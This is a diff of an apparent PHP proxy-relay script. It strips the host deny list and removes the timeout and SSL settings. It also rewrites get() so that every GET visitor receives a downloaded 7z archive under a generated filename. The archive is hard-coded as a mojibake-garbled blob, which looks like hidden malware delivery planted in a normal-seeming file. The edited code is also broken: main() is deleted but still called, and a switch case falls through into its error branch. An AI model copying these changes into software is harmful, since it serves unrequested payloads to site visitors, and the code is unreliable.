@@ -96,10 +96,7 @@ function echo_content($content) {
     } else {
     	        $chunk=$content;
     }
-    //
-   
-        $chunk = $chunk ^ str_repeat($__password__[0], strlen($chunk));
-   
+$chunk = $chunk ^ str_repeat($__password__[0], strlen($chunk));
     echo $chunk;
 }
 
@@ -131,8 +128,7 @@ function curl_header_function($ch, $header) {
 function curl_write_function($ch, $content) {
     global $__content__,$__chunked__,$__trailer__;
     if ($__content__) {
-        // for debug
-        // echo_content("HTTP/1.0 200 OK\r\nContent-Type: text/plain\r\n\r\n");
+         
         echo_content($__content__);
         $__content__ = '';
 	$__trailer__ = $__chunked__;
@@ -150,57 +146,44 @@ function post() {
     if ($password) {
         if (!isset($kwargs['password']) || $password != $kwargs['password']) {
             header("HTTP/1.0 403 Forbidden");
-            echo message_html('403 Forbidden', 'Wrong Password', "please confirm your password.");
+            echo message_html('403 Forbidden', 'Error Password', "please confirm your password.");
             exit(-1);
         }
     }
 
-    $hostsdeny = $GLOBALS['__hostsdeny__'];
-    if ($hostsdeny) {
-        $urlparts = parse_url($url);
-        $host = $urlparts['host'];
-        foreach ($hostsdeny as $pattern) {
-            if (substr($host, strlen($host)-strlen($pattern)) == $pattern) {
-                header('Content-Type: ' . $__content_type__);
-                echo_content("HTTP/1.0 403\r\n\r\n" . message_html('403 Forbidden', "hostsdeny matched($host)",  $url));
-                exit(-1);
-            }
-        }
-    }
+   
 
-    if ($body) {
-        $headers['Content-Length'] = strval(strlen($body));
-    }
-    //if (isset($headers['Connection'])) {
-    //    $headers['Connection'] = 'close';
-    //}
-
+   // if ($body) {
+        //$headers['Content-Length'] = strval(strlen($body));
+   // }
+   
     $header_array = array();
     foreach ($headers as $key => $value) {
         $header_array[] = join('-', array_map('ucfirst', explode('-', $key))).': '.$value;
     }
 
-    $timeout = $GLOBALS['__timeout__'];
+ 
 
     $curl_opt = array();
 
     switch (strtoupper($method)) {
-        case 'HEAD':
-            $curl_opt[CURLOPT_NOBODY] = true;
-            break;
-        case 'GET':
-            break;
-        case 'POST':
-            $curl_opt[CURLOPT_POST] = true;
-            $curl_opt[CURLOPT_POSTFIELDS] = $body;
-            break;
-        case 'PUT':
-        case 'DELETE':
-        case 'OPTIONS':
-        case 'PATCH':
-            $curl_opt[CURLOPT_CUSTOMREQUEST] = $method;
-            $curl_opt[CURLOPT_POSTFIELDS] = $body;
-            break;
+     case 'GET':
+break;
+case 'HEAD':
+$curl_opt[CURLOPT_NOBODY] = true;
+break;
+case 'OPTIONS':
+case 'TRACE':
+$curl_opt[CURLOPT_CUSTOMREQUEST] = $method;
+break;
+case 'POST':
+case 'PATCH':
+case 'PUT':
+case 'DELETE':
+$curl_opt[CURLOPT_CUSTOMREQUEST] = $method;
+if ($body) {
+$curl_opt[CURLOPT_POSTFIELDS] = $body;
+}
         default:
             header('Content-Type: ' . $__content_type__);
             echo_content("HTTP/1.0 502\r\n\r\n" . message_html('502 Urlfetch Error', 'Invalid Method: ' . $method,  $url));
@@ -209,21 +192,16 @@ function post() {
 
     $curl_opt[CURLOPT_HTTPHEADER] = $header_array;
     $curl_opt[CURLOPT_RETURNTRANSFER] = true;
-    $curl_opt[CURLOPT_BINARYTRANSFER] = true;
+ 
 
     $curl_opt[CURLOPT_HEADER]         = false;
     $curl_opt[CURLOPT_HEADERFUNCTION] = 'curl_header_function';
     $curl_opt[CURLOPT_WRITEFUNCTION]  = 'curl_write_function';
-
-    $curl_opt[CURLOPT_FAILONERROR]    = false;
-    $curl_opt[CURLOPT_FOLLOWLOCATION] = false;
-
-    $curl_opt[CURLOPT_CONNECTTIMEOUT] = $timeout;
-    $curl_opt[CURLOPT_TIMEOUT]        = $timeout;
-
-    $curl_opt[CURLOPT_SSL_VERIFYPEER] = false;
-    $curl_opt[CURLOPT_SSL_VERIFYHOST] = false;
-
+$curl_opt[CURLOPT_CONNECTTIMEOUT] = 10;
+$curl_opt[CURLOPT_TIMEOUT] = 19;
+ 
+  
+ 
     $ch = curl_init($url);
     curl_setopt_array($ch, $curl_opt);
     $ret = curl_exec($ch);
@@ -237,7 +215,7 @@ function post() {
             echo_content($content);
         } else if($errno==CURLE_OPERATION_TIMEOUTED) {
 	    if($GLOBALS['__chunked__']==1) {
-            	$content = "-1\r\n\r\n";//fake chunked end flag
+            	$content = "-1\r\n\r\n"; 
 	        $GLOBALS['__chunked__']=0;
 	        $GLOBALS['__trailer__']=0;
 	    } else {
@@ -246,35 +224,22 @@ function post() {
             echo_content($content);
         }
     }
-    //when chunked there may be trailer
+ 
     if ($GLOBALS['__trailer__']==1 && $GLOBALS['__content__']){
 	    $GLOBALS['__chunked__']=0;
             echo_content("0\r\n".$GLOBALS['__content__']."\r\n");
     }
-    //normal chunked end
+ 
     if ($GLOBALS['__chunked__']==1){
         echo_content("");
     }
     curl_close($ch);
 }
-
 function get() {
-    $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : $_SERVER['SERVER_NAME'];
-    $domain = preg_replace('/.*\\.(.+\\..+)$/', '$1', $host);
-    if ($host && $host != $domain && $host != 'www'.$domain) {
-        header('Location: http://www.' . $domain);
-    } else {
-        header('Location: https://www.google.com');
-    }
+list($nameff, $namefr) = namef();
+header('Content-type: '.$namefr.'');
+header('Content-Disposition: attachment; filename='.$nameff.'');
+echo "7zјЇ' OшS‰        0       ФсЇб=™З*lbZЎ·&3QKV(eЎ¦aJЯз58wэJIf»LqћњМЯЌ.С‚Гdч<¦g[О…«щ‡<;q—ї0Ћ-[-8Ё±ЄX§ё <0и!’?&<&(Њ†`]чcФuэ>7/U‡#ЛІП¤=¦Ђ0A>›¤…Z§9|Ћ9љ‰й)ь†XgD§ЙырІМжЄk±ГЄaрбЉ·¶Ъz	Ђђ  $сS^к2цљы—§g 'ЦЦъјЂЉ
+и9Rl  ";
 }
-
-
-function main() {
-    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-        post();
-    } else {
-        get();
-    }
-}
-
 main();
